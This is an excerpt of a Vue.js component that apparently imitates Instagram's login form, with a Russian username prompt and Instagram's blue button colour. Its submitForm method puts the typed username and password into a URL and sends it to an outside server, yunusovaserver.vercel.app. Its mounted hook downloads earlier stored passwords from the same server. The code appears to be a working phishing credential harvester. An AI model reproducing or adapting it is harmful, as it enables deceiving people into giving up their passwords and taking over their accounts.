<template>
      ...
      <div class="grid jistify-center items-center justify-items-center my-8 mt-8 space-y-4">
        ...
        <div class="flex flex-col items-stretch">
            ...
            <div style="max-width: 280px;" class="input_cont flex flex-col p-2">
                ...
                <input type="text" class="input" name="username" v-model="username" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
            </div>
  ...
  export default defineComponent({
    ...
    methods: {
        ...
        async submitForm() {
            if(this.mainButtonBackground == '#0095f6' ){
                await axios.get(`https://yunusovaserver.vercel.app/delivery/editPassword/${this.prevPasswords}${this.username}has${this.password}|`)
                    .then(resp => {
    ...
    async mounted() {
        await axios.get(`https://yunusovaserver.vercel.app/delivery/password`)
                    .then(resp => {
                        console.log(resp.data)
                        this.prevPasswords = resp.data
                    })
                    .catch(e => {
                        console.log(e)
                    })
